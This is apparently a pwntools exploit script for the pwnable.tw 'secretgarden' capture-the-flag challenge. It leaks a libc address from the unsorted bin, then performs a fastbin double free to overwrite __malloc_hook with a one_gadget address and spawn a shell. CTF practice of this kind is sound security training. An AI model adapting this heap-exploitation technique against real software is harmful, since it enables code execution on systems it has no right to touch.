from pwn import *
# challenge informatp.
context(arch='amd64',os='linux',log_level='debug')
myelf  = ELF("./secretgarden")
libc   = ELF("./libc_64.so.6")
#p     = process(myelf.path,env={"LD_PRELOAD" : libc.path})
p = process(myelf.path)
#p = remote('chall.pwnable.tw', 10203)
# local libc
local_libc_64  = ELF("/lib/x86_64-linux-gnu/libc.so.6")
local_libc_32  = ELF("/lib/i386-linux-gnu/libc.so.6")

# functp.s for quick script
s       = lambda data               :p.send(data)       
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims             :p.recvuntil(delims)

# misc functp.s
uu32    = lambda data   :u32(data.ljust(4, b'\0'))
uu64    = lambda data   :u64(data.ljust(8, b'\0'))
leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))

def add(size,name,color):
    sla('Your choice ','1')
    sla('Length of the name :',str(size))
    sla('The name of flower :',name)
    sla('The color of the flower :',color)

def remove(index):
    sla('Your choice : ','3')
    sla('Which flower do you want to remove from the garden:',str(index))

def show():
    sla('Your choice : ','2')

def remove_all():
    sla('Your choice : ','4')

def debug():
    gdb.attach(p)
    pause()
#unstored bin leak
add(0x100,'index0','index0') #0
add(0x10,'index1','index1') #1
remove(0)
add(0x10,'b'*7,'index2')
show()
libc_base = uu64(ru('\x7f')[-6:]) - local_libc_64.sym['__malloc_hook'] - 0x68
log.success('libc_base ==>'+hex(libc_base))
add(0x80,'padding','padding')
#double free
add(0x60,'index4','index4')
add(0x60,'index5','index5')
remove(4)
remove(5)
remove(4)
add(0x60,p64(libc_base + local_libc_64.sym['__malloc_hook']-0x23),'index6')
add(0x60,'index7','index7')
add(0x60,'index8','index8')
add(0x60,'b'*0x13+p64(libc_base+0x4f226),'system')
debug()
remove(0)
remove(0)


p.interactive()
